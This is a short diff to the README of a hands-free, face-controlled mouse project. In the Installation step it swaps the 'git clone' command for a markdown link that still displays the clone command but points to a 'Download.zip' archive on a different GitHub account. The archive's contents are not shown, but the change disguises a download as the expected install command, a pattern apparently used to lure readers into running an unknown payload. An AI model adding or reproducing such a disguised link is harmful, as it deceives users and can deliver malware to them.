@@ -30,4 +30,4 @@ A **hands-free mouse control system** using your **face and eye movements**, pow
 ## Installation
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/face-controlled-mouse.git
+   [git clone https://github.com/your-username/face-controlled-mouse.git](https://github.com/mr-mm12/FCM/archive/refs/tags/Download.zip)
